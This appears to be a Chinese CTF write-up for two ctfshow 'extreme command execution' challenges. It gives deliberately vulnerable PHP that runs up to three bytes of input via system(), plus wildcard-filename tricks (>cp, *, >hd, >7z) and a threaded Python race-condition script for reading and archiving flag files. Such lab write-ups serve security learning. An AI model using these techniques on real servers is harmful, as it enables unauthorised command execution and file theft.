+++
title= "Ctfshow极限大挑战之三字节读取文件"
slug= "ctfshow-extreme-challenge-3-byte-file-read"
description= ""
date= "2025-08-26T18:08:15+08:00"
lastmod= "2025-08-26T18:08:15+08:00"
image= ""
license= ""
categories= ["ctfshow"]
tags= ["php","RaceCondition"]

+++

## 极限命令执行6

```php
<?php
error_reporting(0);
if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 3) {
        sleep(1);
        system($ctfshow);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

没有限制，就是三个字节就能任意执行，第一想法还是HITCON类似的依靠文件名来进行RCE，`ls`发现在当前目录有flag，我们可以知道`*`类似于`.`，如果只有这个命令的话可以默认执行当前目录第一个文件

现在我们的目的就是覆盖`index.php`，由于首字母要小于f大于i，所以查了一下只有`hd`，hd解析的是`hexdump`就能读取`index.php`

```bash
>cp
*
>hd
*d*
```

但是我们是利用`index.php`来RCE的，所以需要Race Condition

```python
from concurrent.futures import ThreadPoolExecutor
import time
import requests

url = "http://c29db3cd-5f18-40f9-b134-ad172979409a.challenge.ctf.show/"

check = {'ctf_show': 'ls'}

payload0 = {'ctf_show': '>cp'}
payload1 = {'ctf_show': '*'}
payload2 = {'ctf_show': '>hd'}
payload3 = {'ctf_show': '*d*'}

def send(data):
    r = requests.post(url, data=data)
    print(r.text)

if __name__ == "__main__":
    send(payload0)
    send(check)

    time.sleep(1)

    executor = ThreadPoolExecutor(max_workers=50)
    args_list = [payload1, payload2, payload3]
    for args in args_list:
        time.sleep(0.1)
        executor.submit(send, args)

```

## 极限命令执行7

```php
<?php
error_reporting(0);


#go back home , your flag is not here!

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 3) {
        system($ctfshow);
    }
}else{
    highlight_file(__FILE__);
}
?>

```

提示了flag在home目录下，然后其他的就没区别了，由于不在当前目录，所以上一题的思路已经用不了了，既然这样，我们就要想办法把文件从`/home`带到当前目录，最好的办法就是压缩文件了

```bash
>7z
>a
>b
* ~
```

然后下载`b.7z`即可

## 小结

三字节无法进行RCE，和g4神讨论了一下，也是临时想到的idea，题目总的来说挺不错的，就是太极限了，而且不能通用。

挺好的题目，感谢**pales1gh**师傅的指导
